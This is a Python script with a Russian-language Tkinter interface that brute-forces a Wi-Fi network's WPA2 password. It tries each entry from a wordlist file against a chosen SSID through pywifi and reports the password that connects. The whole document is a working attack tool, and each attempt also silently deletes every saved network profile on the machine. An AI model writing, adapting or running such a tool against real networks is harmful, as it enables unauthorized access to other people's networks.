from tkinter import *
from pywifi import PyWiFi, const, Profile
from time import sleep
import threading


def wifi_connection(password, ssid):
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]
    iface.disconnect()
    sleep(1)

    if iface.status() == const.IFACE_DISCONNECTED:
        profile = Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password

        iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(profile)
        iface.connect(tmp_profile)

        sleep(1.5)  # чуть быстрее
        return iface.status() == const.IFACE_CONNECTED
    return False


def main():
    ssid = entry.get().strip()
    if not ssid:
        text.insert(END, "Введите название сети.\n")
        return

    with open('wifipwd.txt', 'r', encoding='utf-8') as file:
        for line in file:
            password = line.strip()
            if not password:
                continue

            try:
                if wifi_connection(password, ssid):
                    text.insert(END, f'✅ Пароль найден: {password}\n')
                    text.see(END)
                    break
                else:
                    text.insert(END, f'❌ Не подошло: {password}\n')
                    text.see(END)
                    text.update()
            except Exception as e:
                text.insert(END, f'Ошибка: {str(e)}\n')
                text.see(END)
                text.update()


def start_thread():
    threading.Thread(target=main, daemon=True).start()


# === GUI ===

root = Tk()
root.title('Wi-Fi Брутфорсер')
root.geometry('480x400')
root.configure(bg='#111')

label = Label(root, text='Название Wi-Fi:', bg='#111', fg='#fff', font=('Arial', 12))
label.grid(row=0, column=0, padx=10, pady=10, sticky='w')

entry = Entry(root, font=('Arial', 14), bg="#333", fg="#fff", width=25)
entry.grid(row=0, column=1, padx=10, pady=10)

text = Listbox(root, font=('Courier New', 12), width=50, height=14, bg="#222", fg="#0f0", selectbackground="#444")
text.grid(row=1, column=0, columnspan=2, padx=10, pady=10)

scrollbar = Scrollbar(root)
scrollbar.grid(row=1, column=2, sticky='ns')
text.config(yscrollcommand=scrollbar.set)
scrollbar.config(command=text.yview)

button = Button(root, text='🚀 Начать', font=('Arial', 12), width=20, height=2,
                command=start_thread, bg="#444", fg="#fff", activebackground="#666")
button.grid(row=2, column=0, columnspan=2, pady=10)

root.mainloop()
